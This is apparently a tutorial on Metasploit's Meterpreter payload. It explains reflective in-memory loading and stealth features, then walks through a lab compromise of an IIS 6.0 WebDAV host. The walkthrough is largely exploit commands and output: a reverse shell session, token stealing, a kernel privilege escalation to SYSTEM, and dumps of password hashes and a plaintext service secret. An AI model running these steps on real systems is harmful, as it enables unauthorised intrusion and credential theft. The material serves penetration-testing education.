# Meterpreter

Meterpreter is Metasploit's most capable and strategically designed payload. It is described as the Swiss army knife of penetration testing because it consolidates the post-exploitation tasks that would otherwise require multiple separate tools into a single extensible shell that operates entirely within the target's memory. Its three core design goals are stealth, power, and extensibility, each of which addresses a specific practical need during an engagement.

## How Meterpreter Works

When a Meterpreter payload is executed on a target, the following sequence occurs:

1. The initial stager executes on the target. Depending on the payload selected, this is a bind, reverse, findtag, or passivex stager.
2. The stager downloads a DLL prefixed with `Reflective`. The Reflective stub handles loading and injecting the DLL directly into memory using Reflective DLL injection, replacing the role of the Windows PE loader entirely. This allows the DLL to initialise itself in memory without ever being written to disk, since the standard Windows `LoadLibrary` call requires the binary to exist on disk and is therefore avoided entirely.
3. The Meterpreter core initialises, establishes an AES-encrypted link over the socket, and sends a GET request. Metasploit receives this and configures the client side of the session.
4. Extensions are loaded over the encrypted channel. `stdapi` is always loaded first, providing file system, network, and system command access. If the module grants administrative rights, `priv` is loaded automatically as well.

All communication between the operator and the target uses AES encryption over a TLV (Type-Length-Value) formatted channel, ensuring confidentiality and integrity of all commands and responses from session establishment onwards.

## Stealth Properties

Meterpreter's stealth characteristics stem directly from its architecture:

- **No disk writes:** The payload resides entirely in memory. No executable files, DLLs, or temporary files are created on the target's filesystem during normal operation.
- **No new processes:** Meterpreter injects itself into an existing process rather than spawning a new one. Process listing tools will not show a conspicuous new entry under the attacker's control.
- **Process migration:** Once active, Meterpreter can migrate from one running process to another using the `migrate` command, which injects a copy of itself into the target process and terminates its presence in the original. This is useful for escaping processes that may be killed during normal user activity and for inheriting the security tokens of a higher-privileged process.
- **Limited forensic artefacts:** Because nothing is written to disk and no persistent files are created, conventional forensic analysis of the filesystem produces minimal evidence. Detection of Meterpreter requires memory forensics and behavioural monitoring rather than file-based scanning.

## End-to-End Walkthrough: IIS WebDAV to SYSTEM

The following walkthrough demonstrates the full Meterpreter workflow from initial enumeration through to credential extraction against a Windows IIS target.

### Step 1: Enumerate the Target

```bash
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: http-webdav-scan: WebDAV type Unknown, multiple risky methods available
```

The scan reveals Microsoft IIS 6.0 with WebDAV enabled and several high-risk HTTP methods permitted, including `PUT`, `DELETE`, `MOVE`, and `COPY`. Research against this version identifies CVE-2017-7269, an IIS WebDAV buffer overflow, as well as an older WebDAV write access exploit.

### Step 2: Select and Configure the Exploit

```bash
msf6 > search iis_webdav_upload_asp

   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31  excellent  No  Microsoft IIS WebDAV Write Access Code Execution

msf6 > use 0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
```

The `tun0` interface specifier rather than a hardcoded IP address is good practice when working over a VPN, as it automatically resolves to the correct tunnel interface address.

### Step 3: Execute and Obtain the Session

```bash
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Uploading 612435 bytes to /metasploit28857905.txt...
[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
[*] Executing /metasploit28857905.asp...
[*] Sending stage (175174 bytes) to 10.10.10.15
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030)
```

Note the deletion failure. The exploit uploads a temporary `.asp` file as a delivery vehicle for the stage payload, then attempts to delete it after execution. In this case, the server's permissions prevent deletion, leaving the file on the target. From an operational security standpoint, this is a significant artefact. Blue team analysts monitoring IIS web roots for files matching the pattern `metasploit[0-9]+\.asp` would detect this immediately. In a real engagement, manual cleanup or an alternative delivery method would be required.

### Step 4: Identify Current Privilege Level

```bash
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.
```

The `getuid` failure indicates the current process context lacks even basic read permissions. Listing processes with `ps` reveals the available process table and shows several processes running as `NT AUTHORITY\NETWORK SERVICE`:

```bash
meterpreter > ps

 PID   PPID  Name          Arch  User
 ---   ----  ----          ----  ----
 1836  592   wmiprvse.exe  x86   NT AUTHORITY\NETWORK SERVICE
 3552  1460  w3wp.exe      x86   NT AUTHORITY\NETWORK SERVICE
 3624  592   davcdata.exe  x86   NT AUTHORITY\NETWORK SERVICE
```

### Step 5: Token Stealing and Process Migration

The `steal_token` command duplicates the security token of a target process and applies it to the current Meterpreter thread, elevating the effective privilege level to that of the target process owner without migrating:

```bash
meterpreter > steal_token 1836
Stolen token with username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

With `NETWORK SERVICE` privileges, access to restricted directories such as `C:\Inetpub\AdminScripts` is still denied. The next step is to identify a local privilege escalation path.

### Step 6: Local Exploit Suggester

Background the current session and run `post/multi/recon/local_exploit_suggester` against it:

```bash
meterpreter > bg
Background session 1? [y/N] y

msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

### Step 7: Privilege Escalation to SYSTEM

`ms15_051_client_copy_image` is selected. It uses a Windows kernel vulnerability (CVE-2015-1701) that allows privilege escalation through a flaw in the `win32k.sys` GDI component:

```bash
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The exploit injects its DLL reflectively into a newly launched `notepad.exe` process, executes, and returns a new Meterpreter session as `SYSTEM`.

### Step 8: Credential Extraction

With `SYSTEM` privileges, both the SAM database and LSA secrets are accessible:

```bash
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
<SNIP>

meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
<SNIP>

meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F
<SNIP>
```

`hashdump` extracts LM and NTLM hashes for all local accounts from the SAM database. These can be passed directly in pass-the-hash attacks or submitted to an offline cracking tool such as [Hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/). `lsa_dump_secrets` extracts LSA secrets, which can include plaintext service account passwords stored by Windows for services running under named user accounts, as seen above with `aspnet_WP_PASSWORD`.

## Key Meterpreter Commands Reference

| Category | Command | Function |
|---|---|---|
| **Identity** | `getuid` | Display the current user context |
| | `getsystem` | Attempt automated privilege escalation to SYSTEM |
| | `steal_token <pid>` | Duplicate the security token of a target process |
| | `rev2self` | Revert to the primary process token |
| **Processes** | `ps` | List all running processes |
| | `migrate <pid>` | Inject Meterpreter into a different process |
| | `kill <pid>` | Terminate a process |
| **Credentials** | `hashdump` | Extract NTLM and LM hashes from the SAM database |
| | `lsa_dump_sam` | Dump the full SAM database with account SIDs |
| | `lsa_dump_secrets` | Extract LSA secrets including service account credentials |
| **File System** | `download <file>` | Transfer a file from the target to the operator's machine |
| | `upload <file>` | Transfer a file from the operator's machine to the target |
| | `search -f <pattern>` | Search the filesystem for files matching a pattern |
| **Shell** | `shell` | Drop into a native Windows `cmd.exe` shell |
| | `irb` | Open an interactive Ruby shell within the session |
| **Session** | `background` | Background the current session |
| | `transport` | Change or add transport mechanisms for the session |
| | `load <extension>` | Dynamically load a Meterpreter extension |
